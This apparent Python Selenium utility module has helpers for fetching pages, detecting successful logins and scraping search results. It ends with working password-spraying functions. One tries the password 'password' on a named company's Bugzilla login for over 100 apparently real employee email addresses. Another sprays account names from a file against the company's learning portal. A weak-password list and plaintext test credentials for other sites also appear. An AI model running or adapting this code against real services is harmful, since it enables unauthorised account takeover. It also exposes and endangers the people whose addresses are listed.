import time
import sys
import json
import pprint
import difflib
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.core.utils import ChromeType


def read_get_page(input_url, input_cookie=None, headless_mode=False):
    # 0. init
    chrome_options = Options()
    # 1. set headless
    chrome_options.add_argument("--incognito")
    if headless_mode:
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')

    # 2. set user-agent
    ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) " \
         "AppleWebKit/537.36 (KHTML, like Gecko) " \
         "Chrome/92.0.4515.159 Safari/537.36"
    chrome_options.add_argument('user-agent={}'.format(ua))
    # chrome_options.add_argument('--ignore-ssl-errors=yes')
    # chrome_options.add_argument('--ignore-certificate-errors')
    # 3. open browser
    driver = webdriver.Chrome(ChromeDriverManager(chrome_type=ChromeType.CHROMIUM).install(), options=chrome_options)
    # 4. set cookie
    if input_cookie:
        driver.get(input_url)
        driver.add_cookie(input_cookie)
    # 5. send request
    driver.implicitly_wait(10)
    driver.get(input_url)
    # print messages
    for entry in driver.get_log('browser'):
        print(entry)
    temp_result = driver.page_source
    # 6. close browser
    driver.quit()
    return temp_result


"""
test_json_list = [
{'type': 'write', 'xpath': '//*[@id="account"]', 'text': 'account'},
{'type': 'write', 'xpath': '//*[@id="password"]', 'text': 'password'},
{'type': 'click', 'xpath': '/html/body/div/div/div/form/button', 'text': ''}]
x_dict = read_login_header(input_url="https://member.ithome.com.tw/login",input_action_list=test_json_list)
"""


def read_login_auto(input_url, input_username, input_password, headless_mode=False):
    # 0. init
    chrome_options = Options()
    capabilities = DesiredCapabilities.CHROME
    capabilities["goog:loggingPrefs"] = {"performance": "ALL"}
    # 1. set headless
    chrome_options.add_argument("--incognito")
    if headless_mode:
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')
    # 2. set user-agent
    ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) " \
         "AppleWebKit/537.36 (KHTML, like Gecko) " \
         "Chrome/92.0.4515.159 Safari/537.36"
    chrome_options.add_argument('user-agent={}'.format(ua))
    # 3. open browser
    driver = webdriver.Chrome(ChromeDriverManager(chrome_type=ChromeType.CHROMIUM).install(),
                              options=chrome_options,
                              desired_capabilities=capabilities)
    # 5. error login
    try:
        driver.implicitly_wait(10)
        driver.get(input_url)
        time.sleep(2)
        input_list = driver.find_elements(By.XPATH, "//input")
        link_list = driver.find_elements(By.XPATH, "//a[@href]")
        status_login = False
        for i_link in range(0, len(link_list)):
            if status_login:
                break
            for i_input in range(1, len(input_list)):
                if status_login:
                    break
                driver.get(input_url)
                driver.refresh()
                time.sleep(3)
                temp_link_list = driver.find_elements(By.XPATH, "//a")
                temp_input_list = driver.find_elements(By.XPATH, "//input")
                print(str(i_link) + "-" + str(i_input))
                try:
                    temp_input_list[i_input - 1].send_keys(input_username)
                    temp_input_list[i_input].send_keys(input_password + "1")
                    temp_link_list[i_link].click()
                    time.sleep(3)
                    error_login_source = driver.page_source
                    driver.get(input_url)
                    driver.refresh()
                    temp_link_list = driver.find_elements(By.XPATH, "//a")
                    temp_input_list = driver.find_elements(By.XPATH, "//input")
                    temp_input_list[i_input - 1].send_keys(input_username)
                    temp_input_list[i_input].send_keys(input_password)
                    temp_link_list[i_link].click()
                    time.sleep(3)
                    valid_login_source = driver.page_source
                    diff = 1 - (difflib.SequenceMatcher(None, error_login_source, valid_login_source).quick_ratio())
                    diff_present = diff * 100
                    print('diff: ' + str(diff_present) + '%')
                    if 0.1 < diff_present:
                        temp_logs = driver.get_log("performance")
                        temp_header = read_extra(input_url, temp_logs)
                        status_login = True
                        print("header:" + str(temp_header))
                        print('login success')
                    else:
                        print('login fail')
                except Exception as ex:
                    pass
        driver.get(input_url)
        time.sleep(1)
        button_list = driver.find_elements(By.XPATH, "//button")
        input_list = driver.find_elements(By.XPATH, "//input")
        for i_button in range(0, len(button_list)):
            if status_login:
                break
            for i_input in range(1, len(input_list)):
                if status_login:
                    break
                driver.get(input_url)
                driver.refresh()
                temp_button_list = driver.find_elements(By.XPATH, "//button")
                temp_input_list = driver.find_elements(By.XPATH, "//input")
                print(str(i_button) + "-" + str(i_input))
                try:
                    temp_input_list[i_input - 1].send_keys(input_username)
                    temp_input_list[i_input].send_keys(input_password + "1")
                    temp_button_list[i_button].click()
                    time.sleep(1)
                    error_login_source = driver.page_source
                    driver.refresh()
                    temp_button_list = driver.find_elements(By.XPATH, "//button")
                    temp_input_list = driver.find_elements(By.XPATH, "//input")
                    temp_input_list[i_input - 1].send_keys(input_username)
                    temp_input_list[i_input].send_keys(input_password)
                    temp_button_list[i_button].click()
                    time.sleep(1)
                    valid_login_source = driver.page_source
                    diff = (difflib.SequenceMatcher(None, error_login_source, valid_login_source).quick_ratio())
                    print('diff: ' + str(100 - (diff * 100)) + '%')
                    if diff > 0:
                        status_login = True
                        temp_logs = driver.get_log("performance")
                        temp_header = read_extra(input_url, temp_logs)
                        print("header:" + temp_header)
                        print('login success')
                    else:
                        print('login fail')
                except Exception as ex:
                    pass
    except Exception as ex:
        print('Exception:' + str(ex))
    finally:
        driver.quit()
        return status_login


def read_login_header(input_url, input_action_list, input_cookie=None, headless_mode=False):
    # 0. init
    chrome_options = Options()
    capabilities = DesiredCapabilities.CHROME
    capabilities["goog:loggingPrefs"] = {"performance": "ALL"}
    before_login_source = None
    error_login_source = None
    valid_login_source = None
    second_write = False
    # 1. set headless
    chrome_options.add_argument("--incognito")
    if headless_mode:
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')
    # 2. set user-agent
    ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) " \
         "AppleWebKit/537.36 (KHTML, like Gecko) " \
         "Chrome/92.0.4515.159 Safari/537.36"
    chrome_options.add_argument('user-agent={}'.format(ua))
    # 3. open browser
    driver = webdriver.Chrome(ChromeDriverManager(chrome_type=ChromeType.CHROMIUM).install(),
                              options=chrome_options,
                              desired_capabilities=capabilities)
    driver.set_window_size(1024, 768)
    # 4. set cookie
    if input_cookie:
        driver.get(input_url)
        driver.add_cookie(input_cookie)
    # 5. error login
    try:
        driver.implicitly_wait(10)
        driver.get(input_url)
        before_login_source = driver.page_source
        for temp_action in input_action_list:
            if temp_action['type'] == 'click':
                driver.find_element(By.XPATH, temp_action['xpath']).click()
            if temp_action['type'] == 'write':
                if second_write:
                    driver.find_element(By.XPATH, temp_action['xpath']).send_keys(temp_action['text'] + '1')
                else:
                    driver.find_element(By.XPATH, temp_action['xpath']).send_keys(temp_action['text'])
                    second_write = True
        time.sleep(3)
        error_login_source = driver.page_source
        # driver.refresh()
        driver.get(input_url)
        error_auth_logs = driver.get_log("performance")
        error_header = read_extra(input_url, error_auth_logs)
        print(error_header)
        print("header length:" + str(len(str(error_header))))
    except Exception as ex:
        print('Exception:' + str(ex))
    finally:
        driver.quit()

    # 6. try login
    driver_2 = webdriver.Chrome(ChromeDriverManager(chrome_type=ChromeType.CHROMIUM).install(),
                                options=chrome_options,
                                desired_capabilities=capabilities)
    driver_2.set_window_size(1024, 768)
    driver_2.get(input_url)
    for temp_action in input_action_list:
        if temp_action['type'] == 'click':
            driver_2.find_element(By.XPATH, temp_action['xpath']).click()
        if temp_action['type'] == 'write':
            driver_2.find_element(By.XPATH, temp_action['xpath']).send_keys(temp_action['text'])
    time.sleep(3)
    valid_login_source = driver_2.page_source
    # driver_2.refresh()
    driver_2.get(input_url)
    temp_logs = driver_2.get_log("performance")
    temp_header = read_extra(input_url, temp_logs)
    print(temp_header)
    print("header length:" + str(len(str(temp_header))))
    # 7. close browser and return result
    driver_2.quit()
    diff_error = difflib.SequenceMatcher(None, before_login_source, error_login_source).quick_ratio()
    diff_valid = difflib.SequenceMatcher(None, before_login_source, valid_login_source).quick_ratio()
    diff = int(abs(diff_error - diff_valid) * 100)
    print('diff: ' + str(diff) + '%')
    if diff < 10:
        print('login fail')
    else:
        print('login success')
    """
    if len(str(error_header)) == len(str(temp_header)):
        print('login fail')
    else:
        print('login success')
    """
    return temp_header


def read_extra(input_url, input_logs):
    extra_info = False
    for entry in input_logs:
        temp_log = json.loads(entry["message"])["message"]
        try:
            if temp_log['params']['request']['url'] == input_url:
                if "Network.requestWillBeSent" == temp_log["method"]:
                    extra_info = True
        except Exception:
            pass
        if extra_info:
            if "Network.requestWillBeSentExtraInfo" == temp_log["method"]:
                extra_header = temp_log['params']['headers']
                extra_info = False
    return extra_header


def read_bing_search(input_query, input_cookie=None, headless_mode=False):
    # 0. init setting
    retry_count = 5
    max_page = 5
    chrome_options = Options()
    chrome_options.add_argument("--incognito")
    result_list = []
    url_list = []
    title_list = []
    # 1. set headless
    if headless_mode:
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')
    # 2.1 set default header
    ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) " \
         "AppleWebKit/537.36 (KHTML, like Gecko) " \
         "Chrome/92.0.4515.159 Safari/537.36"
    chrome_options.add_argument('user-agent={}'.format(ua))
    # 3. open browser
    basic_url = "https://www.bing.com/search?q="
    temp_url = basic_url + input_query
    driver = webdriver.Chrome(ChromeDriverManager(chrome_type=ChromeType.CHROMIUM).install(),
                              chrome_options=chrome_options)
    # 4. set cookie
    if input_cookie:
        driver.get(temp_url)
        driver.add_cookie(input_cookie)
    # 5. send request
    driver.implicitly_wait(10)
    driver.get(temp_url)
    # 6. Crawler
    for _page in range(max_page):
        soup = BeautifulSoup(driver.page_source, 'html.parser')
        h2_list = soup.find_all('h2')
        for h2 in h2_list:
            try:
                temp_dict = h2.contents[0].attrs
                if len(temp_dict) > 1:
                    temp_url = temp_dict['href']
                    temp_title = h2.text
                    if 'http' in temp_dict['href']:
                        if temp_url not in url_list:
                            url_list.append(temp_url)
                            title_list.append(temp_title)
                            result_list.append({'title': temp_title, 'link': temp_url})
            except Exception as ex:
                print(str(ex))
                pass

        # 6.1 Turn to the next page
        try:
            driver.find_element(By.XPATH, "//a[@class='sb_pagN sb_pagN_bp b_widePag sb_bp ']").click()
            time.sleep(1)
        except Exception as ex:
            print('Search Early Stopping.')
            print(ex)
            retry_count = retry_count - 1
            if retry_count == 0:
                break

    # 7. close browser
    driver.quit()

    return result_list


def read_google_search(input_query,
                       input_cookie=None,
                       headless_mode=False):
    # 0. init setting
    retry_count = 5
    max_page = 5
    chrome_options = Options()
    chrome_options.add_argument("--incognito")
    title_list = []
    # 1. set headless
    if headless_mode:
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')

    # 2 set default header
    ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) " \
         "AppleWebKit/537.36 (KHTML, like Gecko) " \
         "Chrome/92.0.4515.159 Safari/537.36"
    chrome_options.add_argument('user-agent={}'.format(ua))

    # 3. open browser
    basic_url = "https://www.google.com/search?q="
    temp_url = basic_url + input_query
    driver = webdriver.Chrome(ChromeDriverManager(chrome_type=ChromeType.CHROMIUM).install(),
                              chrome_options=chrome_options)
    # 4. set cookie
    if input_cookie:
        driver.get(temp_url)
        driver.add_cookie(input_cookie)
    # 5. send request
    driver.implicitly_wait(10)
    driver.get(temp_url)
    # 6. Crawler
    for _page in range(max_page):
        soup = BeautifulSoup(driver.page_source, 'html.parser')
        titles = soup.find_all('h3')
        for title in titles:
            try:
                temp_url = title.parent['href']
                if title not in title_list:
                    title_list.append({"name": title.text, "url": temp_url})
            except Exception as ex:
                print('Exception:' + str(ex))
        # 6.1. Turn to the next page
        try:
            driver.find_element(By.LINK_TEXT, '下一頁').click()
            time.sleep(1)
        except Exception as ex:
            print('Search Early Stopping.')
            print(ex)
            retry_count = retry_count - 1
            if retry_count == 0:
                break

    # 6. close browser
    driver.quit()

    return title_list


def read_json(input_file):
    temp_file = open(input_file)
    temp_json = json.load(temp_file)
    return temp_json


def read_get_page_screenshot(input_url, input_path, input_filename, input_cookie=None, headless_mode=False):
    # 0. init
    chrome_options = Options()
    # 1. set headless
    chrome_options.add_argument("--incognito")
    if headless_mode:
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')

    # 2. set user-agent
    ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) " \
         "AppleWebKit/537.36 (KHTML, like Gecko) " \
         "Chrome/92.0.4515.159 Safari/537.36"
    chrome_options.add_argument('user-agent={}'.format(ua))
    # driver = webdriver.Chrome(ChromeDriverManager(chrome_type=ChromeType.CHROMIUM).install(), options=chrome_options)
    driver = webdriver.Chrome("chromedriver.exe", options=chrome_options)
    # 4. set cookie
    if input_cookie:
        driver.get(input_url)
        driver.add_cookie(input_cookie)
    # 5. send request
    driver.implicitly_wait(10)
    driver.set_window_size(1200, 600)
    driver.get(input_url)
    time.sleep(5)
    # 6. close browser
    driver.get_screenshot_as_file(input_path + input_filename)
    driver.quit()
    return


def brute_test_1():
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC

    # Setup Chrome options
    chrome_options = webdriver.ChromeOptions()

    # Start the browser
    driver = webdriver.Chrome("chromedriver.exe", options=chrome_options)
    emails = [
        "james.tung@liteon.com",
        "roger.chen@liteon.com",
        "michael.chen@liteon.com",
        "leon.chang@liteon.com",
        "charley.chang@liteon.com",
        "tom.fang@liteon.com",
        "angie.chang@liteon.com",
        "zora.wang@liteon.com",
        "max.hsieh@liteon.com",
        "shilung.chiang@liteon.com",
        "john.kuo@liteon.com",
        "jason.lee@liteon.com",
        "eric.lin@liteon.com",
        "lewis.chiang@liteon.com",
        "pei-shan.lee@liteon.com",
        "sunny.hsieh@liteon.com",
        "paul.hsu@liteon.com",
        "hai.huang@liteon.com",
        "steven.huang@liteon.com",
        "johnny.wu@liteon.com",
        "hubert.ouyang@liteon.com",
        "shen.joe@liteon.com",
        "celia.wang@liteon.com",
        "vickie.tseng@liteon.com",
        "chiu.anson@liteon.com",
        "celia.wang@liteon.com",
        "violet.yu@liteon.com",
        "maurice.wang@liteon.com",
        "jerry.hsu@liteon.com",
        "alex.sung@liteon.com",
        "john.huang@liteon.com",
        "hank.kwuo@liteon.com",
        "raymond.soong@liteon.com",
        "mark.ku@liteon.com",
        "ricky.liu@liteon.com",
        "lucy.tseng@liteon.com",
        "moris.lin@liteon.com",
        "victor.lin@liteon.com",
        "jason.tzeng@liteon.com",
        "allan.lai@liteon.com",
        "sean.shiue@liteon.com",
        "jim.chen@liteon.com",
        "norlis.amaya@liteon.com",
        "keehane.ngoh@liteon.com",
        "sin.heng.lim@liteon.com",
        "marcelo.araujo@liteon.com",
        "yiyun.huang@liteon.com",
        "wj.lin@liteon.com",
        "tom.soong@liteon.com",
        "leonard.gaul@liteon.com",
        "marcelo.barbosa@liteon.com",
        "jonadaks.kramer@liteon.com",
        "aline.sales@liteon.com",
        "sofia.wang@liteon.com",
        "wen.sun.tan@liteon.com",
        "pierfranco.pontrandolfo@liteon.com",
        "hao.hou@liteon.com",
        "mario.barreto@liteon.com",
        "sandy.ren@liteon.com",
        "barton.li@liteon.com",
        "jimmy.sheehan@liteon.com",
        "pintoo.jha@liteon.com",
        "luis.enrique.robles@liteon.com",
        "julie.huang@liteon.com",
        "ariana.silva@liteon.com",
        "purna.chandra.biswal@liteon.com",
        "victor.lv@liteon.com",
        "megan.morta@liteon.com",
        "rohit.giri@liteon.com",
        "eduardo.duenas@liteon.com",
        "kevin.liu@liteon.com",
        "mudassir.ali@liteon.com",
        "luis.ernesto.aranda@liteon.com",
        "willyson.teixeira@liteon.com",
        "melany.elizabeth.becerra@liteon.com",
        "idon.pong@liteon.com",
        "allen.song@liteon.com",
        "akanksha.pandey@liteon.com",
        "magaly.delgadillo@liteon.com",
        "susan.liu@liteon.com",
        "wing.eng@liteon.com",
        "jingle.chang@liteon.com",
        "bob.weng@liteon.com",
        "gidelle.rocha@liteon.com",
        "adalberto.junior@liteon.com",
        "james.tsao@liteon.com",
        "hill.dong@liteon.com",
        "peggy.chang@liteon.com",
        "jacky.juan@liteon.com",
        "yaozheng.wu@liteon.com",
        "tommy.wong@liteon.com",
        "dingding.jiang@liteon.com",
        "jack.tseng@liteon.com",
        "tim.f@liteon.com",
        "richard.guo@liteon.com",
        "annielee.annielee@liteon.com",
        "hp.cao@liteon.com",
        "rebecca.ma@liteon.com",
        "cheng.arvin@liteon.com",
        "yonggao.deng@liteon.com",
        "js.chen@liteon.com",
        "elton.wang@liteon.com",
        "dragon.liao@liteon.com",
        "ben.yu@liteon.com",
        "kingwin.liu@liteon.com",
        "ricoxie.liteon@liteon.com",
        "kant.li@liteon.com",
        "pj.chang@liteon.com"
    ]

    for email in emails:
        for i in range(0, 5):
            # Navigate to the URL
            driver.get('https://bug121.liteon.com/index.cgi?GoAheadAndLogIn=1')

            # Fill in the form
            driver.find_element(By.NAME, 'Bugzilla_login').send_keys(email)
            driver.find_element(By.NAME, 'Bugzilla_password').send_keys('password')

            # Submit the form
            driver.find_element(By.NAME, 'GoAheadAndLogIn').submit()
            try:
                element = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, "error_msg"))
                )
                print(element.text)
                if element.text == 'The login or password you entered is not valid.':
                    print('fail count:' + str(i))
                else:
                    print("found: " + email)
                    break
            except Exception as e:
                print("Login failed:", e)
    # Remember to close the browser
    driver.quit()


def brute_test_2():
    weak_passwords = [
        "Password01", "Qwerty123", "Abcd1234", "Admin1234", "Password02", "Qwerty1234", "Zxcvbnm1",
        "Abcdefg1", "Admin5678", "Abcd5678", "Password03", "Qwerty01", "Zxcvbnm123", "Abcdefg2",
        "Admin0000", "Abcd0000", "Password04", "Qwerty02", "Zxcvbnm234", "Abcdefg3", "Admin1111",
        "Abcd1111", "Password05", "Qwerty03", "Zxcvbnm345", "Abcdefg4", "Admin2222", "Abcd2222",
        "Password06", "Qwerty04", "Zxcvbnm456", "Abcdefg5", "Admin3333", "Abcd3333", "Password07",
        "Qwerty05", "Zxcvbnm567", "Abcdefg6", "Admin4444", "Abcd4444", "Password08", "Qwerty06",
        "Zxcvbnm678", "Abcdefg7", "Admin5555", "Abcd5555", "Password09", "Qwerty07", "Zxcvbnm789",
        "Abcdefg8", "Admin6666", "Abcd6666", "Password10", "Qwerty08", "Zxcvbnm890", "Abcdefg9",
        "Admin7777", "Abcd7777", "Password11", "Qwerty09", "Zxcvbnm901", "Abcdefg0", "Admin8888",
        "Abcd8888", "Password12", "Qwerty10", "Zxcvbnm012", "Admin9999", "Abcd9999", "Password13",
        "Qwerty11", "Zxcvbnm123", "Admin0000", "Abcd0000", "Password14", "Qwerty12", "Zxcvbnm234",
        "Admin1111", "Abcd1111", "Password15", "Qwerty13", "Zxcvbnm345", "Admin2222", "Abcd2222",
        "Password16", "Qwerty14", "Zxcvbnm456", "Admin3333", "Abcd3333", "Password17", "Qwerty15",
        "Zxcvbnm567", "Admin4444", "Abcd4444", "Password18", "Qwerty16", "Zxcvbnm678", "Admin5555",
        "Abcd5555", "Password19", "Qwerty17", "Zxcvbnm789", "Admin6666", "Abcd6666", "Password20",
        "Qwerty18", "Zxcvbnm890", "Admin7777", "Abcd7777", "Password21", "Qwerty19", "Zxcvbnm901",
        "Admin8888", "Abcd8888", "Password22", "Qwerty20", "Zxcvbnm012", "Admin9999", "Abcd9999",
        "Password23", "Qwerty21", "Zxcvbnm123", "Admin0000", "Abcd0000", "Password24", "Qwerty22",
        "Zxcvbnm234", "Admin1111", "Abcd1111", "Password25", "Qwerty23", "Zxcvbnm345", "Admin2222",
    ]


def brute_test_3():
    from selenium import webdriver
    from selenium.webdriver.common.by import By

    driver = webdriver.Chrome()
    driver.get("https://learning.liteon.com/dist/index.html#login")
    # 等待一小段時間，確保 HTTP Basic Auth 彈出視窗已經出現
    time.sleep(10)
    with open("account.txt", 'r', encoding='utf-8') as temp_file:
        temp_data = temp_file.readlines()
        for line in temp_data:
            line = line.replace("\n", "")
            username_element = driver.find_element(By.NAME, 'account')
            username_element.clear()
            username_element.send_keys(line)
            password_element = driver.find_element(By.NAME, 'password')
            password_element.clear()
            password_element.send_keys("password")
            time.sleep(1)
            login_button = driver.find_element(By.XPATH, '/html/body/div[2]/div/div/div[2]/form/div[3]/button')
            login_button.click()
            time.sleep(3)
            try:
                driver.find_element("xpath", "//p[contains(@class, 'pt-mark-override') and "
                                             "text()='帳號或密碼錯誤！請重新輸入您的帳號及密碼']")
                print(str(line))
            except Exception as ex:
                pass
            finally:
                time.sleep(2)

    driver.quit()


# testcase
if __name__ == '__main__':
    # print(read_get(input_url="https://www.example.com"))
    # print(read_bing_search('Cymetrics'))
    # print(read_google_search('Cymetrics'))
    brute_test_3()
    """
    # auto login ithome
    read_login_form(input_url="https://member.ithome.com.tw/login",
                    input_username="saicx016",
                    input_password="a12345678",
                    headless_mode=True)
    
    read_login_auto(input_url="http://bioid.tw/login.php",
                    input_username="phe23967@boofx.com",
                    input_password="a12345678",
                    headless_mode=False)
    
    # manual login ithome
    test_json_list = [{'type': 'write', 'xpath': '//*[@id="account"]', 'text': 'saicx016'},
                      {'type': 'write', 'xpath': '//*[@id="password"]', 'text': 'a12345678'},
                      {'type': 'click', 'xpath': '/html/body/div/div/div/form/button', 'text': ''}]
    x_dict = read_login_header(input_url="https://member.ithome.com.tw/login",
                               input_action_list=test_json_list)
    
    main_result = read_get_page(input_url="https://www.example.com")
    if "Example Domain" in main_result:
        print("unit test (custom_chrome) : pass")
        sys.exit(0)
    else:
        print("unit test (custom_chrome) : fail")
        sys.exit(1)
    """


